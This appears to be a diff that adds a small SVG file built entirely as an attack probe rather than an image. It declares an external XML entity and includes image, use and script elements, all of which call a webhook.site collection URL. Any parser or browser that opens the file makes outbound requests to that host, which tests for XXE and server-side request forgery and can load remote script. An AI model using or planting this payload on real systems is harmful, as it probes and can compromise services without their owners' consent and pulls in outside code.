@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/svg-xxe">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/svg-xlink" width="100" height="100"/>
+  <text>&xxe;</text>
+  <use xlink:href="http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/svg-use#id"/>
+  <script xlink:href="http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/svg-script"/>
+</svg>
